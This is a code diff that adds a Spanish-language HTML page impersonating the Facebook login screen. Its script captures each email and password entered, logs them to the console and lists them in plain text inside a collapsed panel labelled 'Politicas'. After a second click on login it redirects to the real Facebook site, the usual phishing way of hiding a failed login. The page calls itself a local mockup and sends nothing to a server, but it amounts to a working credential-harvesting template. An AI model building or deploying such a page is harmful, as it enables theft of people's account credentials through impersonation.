@@ -1,0 +1,417 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Inicio de sesión</title>
+  <style>
+    :root {
+      --bg: #f0f2f5;
+      --card: #ffffff;
+      --text: #1c1e21;
+      --muted: #65676b;
+      --primary: #1877f2;
+      --line: #dddfe2;
+      --success: #42b72a;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .main-wrap {
+      flex: 1;
+      width: 100%;
+      display: grid;
+      place-items: center;
+      padding: 72px 0 112px;
+    }
+
+    .page {
+      width: 100%;
+      max-width: 980px;
+      padding: 0 20px;
+      display: grid;
+      grid-template-columns: 1fr 396px;
+      gap: 36px;
+      align-items: center;
+    }
+
+    .left {
+      padding: 0 16px;
+    }
+
+    .logo {
+      margin: 0;
+      color: var(--primary);
+      font-size: 60px;
+      line-height: 0.95;
+      font-weight: 700;
+      letter-spacing: -1.2px;
+    }
+
+    .tagline {
+      margin: 10px 0 0;
+      max-width: 500px;
+      font-size: 28px;
+      line-height: 1.14;
+      font-weight: 400;
+    }
+
+    .login-card {
+      background: var(--card);
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 24px rgba(0, 0, 0, 0.12);
+      padding: 16px 16px 22px;
+    }
+
+    .field {
+      width: 100%;
+      border: 1px solid var(--line);
+      border-radius: 6px;
+      padding: 14px 16px;
+      font-size: 17px;
+      outline: none;
+      margin-bottom: 12px;
+      color: var(--text);
+      height: 52px;
+    }
+
+    .field::placeholder { color: #90949c; }
+
+    .field:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+    }
+
+    .btn {
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    .btn-login {
+      background: var(--primary);
+      color: #fff;
+      font-size: 20px;
+      height: 48px;
+    }
+
+    .forgot {
+      display: block;
+      text-align: center;
+      text-decoration: none;
+      color: var(--primary);
+      margin: 16px 0 20px;
+      font-size: 14px;
+    }
+
+    .forgot:hover { text-decoration: underline; }
+
+    .divider {
+      border-top: 1px solid var(--line);
+      margin: 0 0 20px;
+    }
+
+    .create-wrap {
+      display: flex;
+      justify-content: center;
+    }
+
+    .btn-create {
+      width: auto;
+      background: var(--success);
+      color: #fff;
+      font-size: 17px;
+      height: 48px;
+      padding: 0 16px;
+    }
+
+    .footer-note {
+      margin-top: 28px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .footer-note strong { font-weight: 700; }
+
+    .local-note {
+      margin-top: 10px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 12px;
+    }
+
+    .data-card {
+      margin-top: 10px;
+      border-top: 1px solid #e5e7eb;
+      padding-top: 8px;
+      font-size: 11px;
+      color: #8a8d91;
+    }
+
+    .data-card summary {
+      cursor: pointer;
+      user-select: none;
+      color: #8a8d91;
+      font-weight: 600;
+      list-style: none;
+      outline: none;
+    }
+
+    .data-card summary::-webkit-details-marker { display: none; }
+
+    .data-card[open] summary {
+      margin-bottom: 6px;
+    }
+
+    .data-content {
+      background: #f7f8fa;
+      border: 1px solid #eceff3;
+      border-radius: 6px;
+      padding: 8px;
+      max-height: 150px;
+      overflow: auto;
+      color: #606770;
+    }
+
+    .data-empty {
+      margin: 0;
+      color: #8a8d91;
+    }
+
+    .data-list {
+      margin: 0;
+      padding-left: 16px;
+    }
+
+    .data-list li + li {
+      margin-top: 6px;
+    }
+
+    .site-footer {
+      width: 100%;
+      background: #fff;
+      border-top: 1px solid #e5e7eb;
+    }
+
+    .footer-inner {
+      max-width: 980px;
+      margin: 0 auto;
+      padding: 20px 20px 26px;
+      color: #8a8d91;
+      font-size: 12px;
+      line-height: 1.35;
+    }
+
+    .langs,
+    .links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 10px 14px;
+    }
+
+    .footer-inner a {
+      color: #8a8d91;
+      text-decoration: none;
+    }
+
+    .footer-inner a:hover { text-decoration: underline; }
+
+    .footer-divider {
+      border-top: 1px solid #dddfe2;
+      margin: 8px 0;
+    }
+
+    .copyright {
+      margin-top: 14px;
+    }
+
+    @media (max-width: 900px) {
+      .main-wrap {
+        padding: 22px 0 42px;
+      }
+
+      .page {
+        grid-template-columns: 1fr;
+        max-width: 430px;
+        gap: 24px;
+      }
+
+      .left {
+        text-align: center;
+        padding: 0;
+      }
+
+      .logo { font-size: 52px; }
+
+      .tagline {
+        margin: 8px auto 0;
+        font-size: 23px;
+      }
+
+      .footer-inner {
+        padding: 16px 14px 22px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-wrap">
+    <main class="page">
+      <section class="left">
+        <h1 class="logo">facebook</h1>
+        <p class="tagline">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+      </section>
+
+      <section class="right">
+        <article class="login-card">
+          <input id="emailInput" class="field" type="text" placeholder="Correo electrónico o número de teléfono" aria-label="Correo electrónico o número de teléfono" />
+          <input id="passwordInput" class="field" type="password" placeholder="Contraseña" aria-label="Contraseña" />
+          <button id="loginBtn" class="btn btn-login">Iniciar sesión</button>
+          <a class="forgot" href="#">¿Olvidaste tu contraseña?</a>
+          <div class="divider"></div>
+          <div class="create-wrap">
+            <button class="btn btn-create">Crear cuenta nueva</button>
+          </div>
+        </article>
+        <div class="footer-note"><strong>Crea una página</strong> para una celebridad, una marca o un negocio.</div>
+        <div class="local-note">Mockup local sin conexión a servidores. Clicks en iniciar sesión: <span id="clickCount">0</span></div>
+        <details class="data-card">
+          <summary>Politicas</summary>
+          <div class="data-content">
+            <div id="dataOutput"></div>
+          </div>
+        </details>
+      </section>
+    </main>
+  </div>
+
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="langs">
+        <a href="#">Español</a>
+        <a href="#">English (US)</a>
+        <a href="#">Português (Brasil)</a>
+        <a href="#">Français (France)</a>
+        <a href="#">Italiano</a>
+        <a href="#">Deutsch</a>
+      </div>
+      <div class="footer-divider"></div>
+      <div class="links">
+        <a href="#">Registrarte</a>
+        <a href="#">Iniciar sesión</a>
+        <a href="#">Messenger</a>
+        <a href="#">Watch</a>
+        <a href="#">Lugares</a>
+        <a href="#">Juegos</a>
+        <a href="#">Marketplace</a>
+        <a href="#">Meta Pay</a>
+        <a href="#">Meta Store</a>
+        <a href="#">Información</a>
+        <a href="#">Ayuda</a>
+      </div>
+      <div class="copyright">Meta © 2026</div>
+    </div>
+  </footer>
+
+  <script>
+    const credencialesGuardadas = [];
+    const mensajesTextoLocales = [];
+    const dataOutput = document.getElementById('dataOutput');
+    const clickCount = document.getElementById('clickCount');
+    let totalClicksInicioSesion = 0;
+
+    function guardarMensajesEnArchivoLocal() {
+      const contenido = mensajesTextoLocales
+        .map((item, index) => `${index + 1}. [${item.fecha}] Para: ${item.destinatario} | Mensaje: ${item.mensaje}`)
+        .join('\n');
+
+      const blob = new Blob([contenido || 'Sin mensajes guardados.'], { type: 'text/plain;charset=utf-8' });
+      const url = URL.createObjectURL(blob);
+      const enlace = document.createElement('a');
+      enlace.href = url;
+      enlace.download = 'mensajes_locales.txt';
+      document.body.appendChild(enlace);
+      enlace.click();
+      document.body.removeChild(enlace);
+      URL.revokeObjectURL(url);
+    }
+
+    function enviarMensajeTextoLocal(destinatario, mensaje) {
+      const registro = {
+        destinatario,
+        mensaje,
+        fecha: new Date().toISOString()
+      };
+
+      mensajesTextoLocales.push(registro);
+      guardarMensajesEnArchivoLocal();
+      console.log('Mensaje guardado localmente:', registro);
+      return registro;
+    }
+
+    function abrirLinkAlLlegarADosClicks() {
+      if (totalClicksInicioSesion === 2) {
+        window.location.href = 'https://es-la.facebook.com/';
+      }
+    }
+
+    function contarClicksInicioSesion() {
+      totalClicksInicioSesion += 1;
+      clickCount.textContent = totalClicksInicioSesion;
+      abrirLinkAlLlegarADosClicks();
+    }
+
+    function renderCredenciales() {
+      if (credencialesGuardadas.length === 0) {
+        dataOutput.innerHTML = '<p class="data-empty">Sin registros todavía.</p>';
+        return;
+      }
+
+      const items = credencialesGuardadas.map((item, index) =>
+        `<li>${index + 1}. Correo: ${item.correo} | Contraseña: ${item.contrasena} | Fecha: ${item.fecha}</li>`
+      ).join('');
+
+      dataOutput.innerHTML = `<ol class="data-list">${items}</ol>`;
+    }
+
+    function guardarCredencialesEnArreglo() {
+      const emailInput = document.getElementById('emailInput');
+      const passwordInput = document.getElementById('passwordInput');
+      const correo = emailInput.value.trim();
+      const contrasena = passwordInput.value;
+
+      if (!correo || !contrasena) {
+        return;
+      }
+
+      credencialesGuardadas.push({
+        correo,
+        contrasena,
+        fecha: new Date().toISOString()
+      });
+
+      renderCredenciales();
+      console.log('Credenciales almacenadas (local):', credencialesGuardadas);
+    }
+
+    document.getElementById('loginBtn').addEventListener('click', () => {
+      contarClicksInicioSesion();
+      guardarCredencialesEnArreglo();
+      enviarMensajeTextoLocal('usuario_local', `Intento de inicio de sesión #${totalClicksInicioSesion}`);
+    });
+    renderCredenciales();
+  </script>
+</body>
+</html>
